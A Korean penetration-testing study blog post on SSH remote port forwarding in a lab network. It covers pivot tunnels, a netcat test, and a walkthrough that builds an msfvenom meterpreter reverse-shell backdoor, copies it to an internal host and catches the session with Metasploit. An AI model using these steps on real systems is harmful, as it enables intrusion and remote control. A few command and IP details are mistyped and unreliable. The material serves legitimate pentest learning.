---
title:  "Remote Port Forwarding"
excerpt: "Remote Port Forwarding에 대해 알아보자."

categories: pnt
tags:
  - [pivoting, tunneling, penetrate, penetration, 'post-exploit', 'port fowarding', network]

typora-root-url: ../../
 
date: 2025-09-02
last_modified_at: 2025-09-02

---
**☀️<u>공지 사항</u>☀️** 해당 페이지는 `Red Raccoon - PNT` 학습 후 추가적인 개인 공부를 통해 재구성 및 실습한 내용입니다. 필자의 환경에 맞게 공부 및 실습을 진행하여 이 점 참고 바랍니다.
{: .notice--danger}

# Remote Port Fowarding

## 개요
리모트 포트 포워딩(Remote Port Forwarding)은 로컬 포트 포워딩의 반대 개념으로 원격 서버에서 포트 수신을 열어 외부에서 내부 네트워크 서비스에 접근할 수 있게 하는 SSH 기반 터널링 기술이다.

주로 리모트(원격) 호스트에 들어오는 트래픽을 현재 공격자의 호스트의 서비스로 전단할 때 주로 사용된다.

리모트 포트 포워딩(Remote Port Forwarding)과 리버스 포트 포워딩(Reverse Port Forwarding)은 본질적으로 같은 개념을 가리키는 용어이다.

## 리모트 포트 포워딩 예시
로컬 포트 포워딩은 대상 호스트의 방화벽이나 보안 정책을 우회하기 위해 사용했다.

리모트 포트 포워딩은 `대상 호스트 -> 공격자 호스트`로 접근 하려고 할 때 이를 제지하는 네트워크 경계를 우회하기 위해 사용된다.

- 명령어 예시:

```bash
ssh -R [원격의 IP:PORT]:[목표 서버 IP:PORT] [SSH 서버 주소]

ssh -R 8000:192.168.0.10:80 vps.example.com
```
위 명령은 vps.example.com의 8000번 포트로 들어오는 요청을 192.168.10.80 으로 전달시킨다.


## 사용하는 상황
- 리버스쉘 / 에이전트 콜백
- 공격자 호스트로부터 파일 다운로드를 하기 위해
- 내부망에 서비스가 있지만 외부에서 직접 접근할 수 없는 경우(방화벽, NAT 등).
- 모의해킹 중 피벗팅, 우회 공격에 활용: 이미 침투한 시스템의 내부 서비스를 외부 협력자에게 노출할 때.
- 사내 PC, 개발 서버에 워크스페이스, 웹 서버, DB 등 테스트용 자원 접근 시 활용.
- 제한된 네트워크 환경에서 SSH 터널을 통해 외부 접근 루트 개방.


## 예시 1: 원격 호스트에서 echo 메시지 보내기
피벗 호스트: 10.1.10.10/10.1.20.10 (DMZ/IT) | SSH/22		, 대상 호스트: 10.1.20.50 | SSH/22


#### 1. 리모트 포트 포워딩: SSH Tunneling 설정
```bash
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ ssh -R 10.1.20.10:4444:10.8.0.37:1234 ansible@10.1.10.10 
[ . . . ]

# netstat 으로 Port 상태 확인하기
ansible@web-10-1-10-10:~$ netstat -tula 
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN    

#10.1.20.50로 ssh
ansible@web-10-1-10-10:~$ ssh ansible@10.1.20.50

```

#### 2. 공격 호스트에서 리스너 생성
```bash
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ nc -l -p 1234
```

#### 3. 대상 호스트에서 `echo 'hi'` 피벗 호스트(10.1.20.10) 포트 4444로 전송
```bash
ansible@ip-10-1-20-50:~$ echo "hi" | nc 10.1.20.10 4444
```

#### 4. 공격 호스트에서 메시지 확인
```bash
# 피벗 호스트에 설정된 리모트 포트 포워딩으로 포트 4444로 받는 트래픽을 포트 1234로 전달됨. hi가 나오면 성공
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ nc -l -p 1234
hi
```


## 예시 2: 피벗 호스트과 리모트 포트 포워딩을 통한 리버스 쉘
피벗 호스트: 10.1.10.10/10.1.20.10 (DMZ/IT) | SSH/22		, 대상 호스트: 10.1.20.50 | SSH/22

익스플로잇은 "이미 성공했다고 가정하고(Assumed Breach)", 마지막 단계에서 리버스 쉘을 피벗 호스트로 콜백 시킨 뒤, 리모트 포트 포워딩을 통해 공격자 칼리 리눅스로 받아내는 실습

#### 1. msfvenom - create payload 
리버스쉘이 콜백할 도착 주소는 피벗 호스트(10.1.10.10/10.1.20.10)의 포트 4444이다. 대상 호스트(10.1.20.50)는 피벗 호스트와 10.1.20.0/24 네트워크 안에서 통신이 가능할거기 때문에, 도착 아이피주소는 10.1.20.10으로 지정한다.
```bash
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.1.20.10 LPORT=4444 -f elf -p namgi_backdoor
```

#### 2. 대상 서버로 페이로드 전송
먼저 backdoor 페이로드를 scp 명령어를 사용해 공격자 호스트에서 피벗 호스트(10.1.10.10/10.1.20.10)로 복사한다.
```bash
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ scp namgi_backdoor ansible@10.1.10.10:/home/ansible
```

그 후, 피벗 호스트 10.1.10.10에 SSH 로그인 후 , 해당 backdoor 페이로드를 다시 대상 호스트(10.1.20.50)로 복사한다.
```bash
ansible@web-10-1-10-10:~$ scp namgi_backdoor ansible@10.1.20.50:/home/ansible
```

#### 3. 리모트 포트 포워딩: SSH Tunneling
피벗 호스트의 포트 4444로 들어오는 모든 트래픽을 공격자 호스트로 전달되게 포트 포워딩 설정
```bash
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ ssh -R 10.1.20.10:4444:0.0.0.0:1234 ansible@10.1.10.10
```

#### 4. multi handler 리스너 생성
리버스 쉘의 콜백을 받고 연결할 핸들러를 공격자 호스트에서 실행시켜준다. 리모트 포트 포워딩이 완료되면 공격자 호스트의 `0.0.0.0:1234`에 트래픽이 도착하니 설정에 참고해서 작성해준다.
```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:1234
```

#### 5. 대상 호스트에서 `backdoor` 페이로드 실행
```bash
ansible@ip-10-1-20-50:~$ ./namgi_backdoor
```

#### 6. Metasploit Listener 확인
```bash
msf6 exploit(multi/handler) > run    
                                           
[*] Started reverse TCP handler on 0.0.0.0:1234 
[*] Sending stage (3045380 bytes) to 127.0.0.1
[*] Meterpreter session 5 opened (127.0.0.1:1234 -> 127.0.0.1:55454) at 2025-09-02 13:42:25 -0400

meterpreter > ipconfig
Interface  2
============
Name         : ens5
[ . . . ] 
IPv4 Address : 10.1.20.50
```

#### 7. 리모트 포트 포워딩 확인
```bash
# 리모트 포트 포워딩 설정 성공!
debug1: Remote connections from 10.1.20.10:4444 forwarded to local address 0.0.0.0:1234
[ . . . ]

# 리버스쉘 콜백 이후 - 포워딩 시작... 10.1.20.10:4444 --> (칼리 리눅스) 0.0.0.0:1234
debug1: remote forward success for: listen 10.1.20.10:4444, connect 0.0.0.0:1234
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 10.1.20.10 port 4444, originator 10.1.20.50 port 32914
debug1: connect_next: start for host 0.0.0.0 ([0.0.0.0]:1234)
debug1: connect_next: connect host 0.0.0.0 ([0.0.0.0]:1234) in progress, fd=4
debug1: channel 0: new forwarded-tcpip [10.1.20.50] (inactive timeout: 0)
debug1: confirm forwarded-tcpip

# 포워딩 성공, 0.0.0.0:1234로 트래픽 전달 완료. 
debug1: channel 0: connected to 0.0.0.0 port 1234
```





